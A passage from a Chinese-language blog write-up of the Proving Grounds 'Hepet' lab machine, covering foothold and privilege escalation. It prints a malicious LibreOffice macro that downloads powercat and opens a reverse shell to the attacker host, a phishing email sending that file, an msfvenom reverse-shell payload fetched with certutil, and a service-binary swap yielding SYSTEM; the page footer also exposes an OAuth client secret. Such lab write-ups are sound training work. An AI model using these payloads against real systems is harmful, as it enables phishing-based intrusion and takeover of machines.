+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub Main</span><br><span class="line">Shell(<span class="string">&quot;cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.45.234/powercat.ps1&#x27;);powercat -c 192.168.45.169 -p 4444 -e powershell&quot;</span>)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
+
+<p>设置为打开文件时，执行macros 反弹shell. 80端口启动http.server, 使用sendemail把附件发给mailadmin，等待片刻后收到反弹shell, 用户是Ela Arwel</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sendemail -f <span class="string">&#x27;jonas@localhost&#x27;</span> -t <span class="string">&#x27;mailadmin@localhost&#x27;</span> -s <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>:<span class="number">25</span> -u <span class="string">&#x27;another spreadsheet&#x27;</span> -m <span class="string">&#x27;spreadsheet&#x27;</span> -a /home/kali/pentestools/windows/clientside/test.ods</span><br><span class="line">Feb <span class="number">23</span> <span class="number">15</span>:<span class="number">54</span>:03 kali sendemail[<span class="number">3004302</span>]: Email was sent successfully!</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc <span class="literal">-nvlp</span> <span class="number">4444</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.45.234</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.184.140</span>] <span class="number">51171</span></span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Try</span> the new cross<span class="literal">-platform</span> PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Program Files\LibreOffice\program&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">hepet\ela arwel</span><br></pre></td></tr></table></figure>
+
+<h1 id="Eacalation"><a href="#Eacalation" class="headerlink" title="Eacalation"></a>Eacalation</h1><p>收集信息发现 service: VeyonService 由localSystem启动，并且在Ela arwrl目录下，有Full control权限，msfenvom生成反弹shell可执行文件，替换veyon-service.exe</p>
+<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=443 -f exe -o shell.exe</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users&gt; <span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Service | </span><br><span class="line">    <span class="built_in">Select-Object</span> Name, State, PathName, StartMode, StartName | </span><br><span class="line">    <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.State <span class="operator">-like</span> <span class="string">&#x27;Running&#x27;</span> <span class="operator">-and</span> <span class="variable">$_</span>.PathName <span class="operator">-notlike</span> <span class="string">&#x27;*svchost.exe*&#x27;</span> &#125;</span><br><span class="line">Name      : COMSysApp</span><br><span class="line">State     : Running</span><br><span class="line">PathName  : C:\WINDOWS\system32\dllhost.exe /Processid:&#123;<span class="number">02</span>D4B3F1<span class="literal">-FD88-11D1-960D-00805FC79235</span>&#125;</span><br><span class="line">StartMode : Manual</span><br><span class="line">StartName : LocalSystem</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Name      : VeyonService</span><br><span class="line">State     : Running</span><br><span class="line">PathName  : C:\Users\Ela Arwel\Veyon\veyon<span class="literal">-service</span>.exe</span><br><span class="line">StartMode : Auto</span><br><span class="line">StartName : LocalSystem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; certutil <span class="literal">-urlcache</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">45.234</span>/tmp/shell.exe s.exe</span><br><span class="line">                             certutil <span class="literal">-urlcache</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">45.234</span>/tmp/shell.exe s.exe</span><br><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">45.234</span>/tmp/shell.exe s.exe</span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil: <span class="literal">-URLCache</span> command completed successfully.</span><br><span class="line">                                                 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; <span class="built_in">mv</span> veyon<span class="literal">-service</span>.exe veyon.exe</span><br><span class="line">                             <span class="built_in">mv</span> veyon<span class="literal">-service</span>.exe veyon.exe</span><br><span class="line"><span class="built_in">mv</span> veyon<span class="literal">-service</span>.exe veyon.exe</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; <span class="built_in">mv</span> s.exe veyon<span class="literal">-service</span>.exe</span><br><span class="line">                             <span class="built_in">mv</span> s.exe veyon<span class="literal">-service</span>.exe</span><br><span class="line"><span class="built_in">mv</span> s.exe veyon<span class="literal">-service</span>.exe                   </span><br></pre></td></tr></table></figure>
+
+<p>没有重启服务权限，但是有重启机器权限，直接shutdown &#x2F;r, 重启后获取system shell</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; <span class="built_in">restart-service</span> VeyonService</span><br><span class="line">                             <span class="built_in">restart-service</span> VeyonService</span><br><span class="line"><span class="built_in">restart-service</span> VeyonService</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; <span class="built_in">restart-service</span> : Service <span class="string">&#x27;Veyon Service (VeyonService)&#x27;</span> cannot be stopped due to the following error: Cannot open </span><br><span class="line">VeyonService service on computer <span class="string">&#x27;.&#x27;</span>.</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ <span class="built_in">restart-service</span> VeyonService</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : CloseError: (System.ServiceProcess.ServiceController:ServiceController) [<span class="built_in">Restart-Service</span> </span><br><span class="line">   ], ServiceCommandException</span><br><span class="line">    + FullyQualifiedErrorId : CouldNotStopService,Microsoft.PowerShell.Commands.RestartServiceCommand</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; net stop VeyonService</span><br><span class="line">                             net stop VeyonService</span><br><span class="line">net stop VeyonService</span><br><span class="line">System error <span class="number">5</span> has occurred.</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; </span><br><span class="line">Access is denied.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Ela Arwel\Veyon&gt; shutdown /<span class="built_in">r</span> /t <span class="number">0</span></span><br><span class="line">                             shutdown /<span class="built_in">r</span> /t <span class="number">0</span></span><br><span class="line">shutdown /<span class="built_in">r</span> /t <span class="number">0</span></span><br><span class="line">                                                 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc <span class="literal">-nvlp</span> <span class="number">443</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">443</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.45.234</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.184.140</span>] <span class="number">49668</span></span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.19042.1348</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+
+<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
+<li>收集信息还是忽略了很多内容，不只要关注软件漏洞、CMS漏洞，手动信息收集也很重要，点击测试查看所有内容知道找到突破点。</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Yiaos
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://www.thiiiiink.com/post/20250223233825.html" title="Proving Grounds Practice - Hepet">https://www.thiiiiink.com/post/20250223233825.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/20250226023557.html" rel="prev" title="Proving Grounds Practice - Shenzi">
+      <i class="fa fa-chevron-left"></i> Proving Grounds Practice - Shenzi
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/20250222023007.html" rel="next" title="Proving Grounds Practice - DVR4">
+      Proving Grounds Practice - DVR4 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Difficulty"><span class="nav-text">Difficulty</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Scan"><span class="nav-text">Scan</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#20001-ftp"><span class="nav-text">20001 ftp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#445-smbclient"><span class="nav-text">445 smbclient</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2224-mlss"><span class="nav-text">2224 mlss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#79-finger"><span class="nav-text">79 finger</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mercury-32-mail"><span class="nav-text">Mercury&#x2F;32 mail</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8000-443"><span class="nav-text">8000 &#x2F; 443</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Foothold"><span class="nav-text">Foothold</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Eacalation"><span class="nav-text">Eacalation</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D"><span class="nav-text">反思</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Yiaos</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yiaos</span>
+</div>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1/dist/medium-zoom.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23lioxBWzEMyWt1JhD',
+      clientSecret: '6d63e8f9065e954d63e6a90407d40a3ccee85f0e',
+      repo        : 'Yiaos.github.io',
+      owner       : 'Yiaos',
+      admin       : ['Yiaos'],
+      id          : '1b4185faf1dbbcd37fc96a45e0479b3c',
+        language: 'en',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
